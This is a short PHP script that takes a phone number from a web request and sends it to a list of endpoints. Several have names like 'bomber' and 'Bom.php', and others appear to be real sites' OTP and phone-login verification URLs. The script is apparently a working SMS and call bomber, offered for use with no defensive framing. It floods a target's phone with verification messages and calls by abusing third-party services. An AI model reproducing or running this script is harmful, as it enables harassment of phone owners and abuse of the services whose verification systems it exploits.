<?php
// List of 53+ APIs
$api_list = [
    "https://your-suyaib.xyz/rafi/call.php?phn=",
    "https://api.versionx10.co/Call/V1.php?phn=",
    "https://alvi0.xyz/Bom.php?phone=",
    "https://mralvi.xyz/m/sms.php?phone=",
    "https://alvi0.xyz/bomber/api.php?num=",
    "https://alvi0.xyz/bsms/sikho.php?phone=",
    "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=",
    "https://ultranetrn.com.br/fonts/api.php?number=",
    "https://ss.binge.buzz/otp/send/phone=",
    "http://api.task10.top/indexapi.php?phone=",
    
    // Add the rest of your APIs here
];

// Check if the number parameter is provided
if (isset($_GET['number'])) {
    $phoneNumber = $_GET['number'];
    $results = [];

    // Loop through the API list and fetch data
    foreach ($api_list as $api) {
        $url = $api . urlencode($phoneNumber);

        // Initialize cURL to call each API
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        // Get the response from the API
        $response = curl_exec($ch);
        curl_close($ch);

        // Convert the response to JSON if necessary
        $data = json_decode($response, true);

        // Store the result from each API in the results array
        if ($data) {
            $results[] = $data;
        } else {
            // If the API response isn't valid JSON, save the raw response
            $results[] = ["error" => "Invalid response from $url", "response" => $response];
        }
    }

    // Return the results as JSON
    header('Content-Type: application/json');
    echo json_encode($results);
} else {
    // If the 'number' parameter is missing, return an error message
    header('Content-Type: application/json');
    echo json_encode(["error" => "Please provide a valid number."]);
}
?>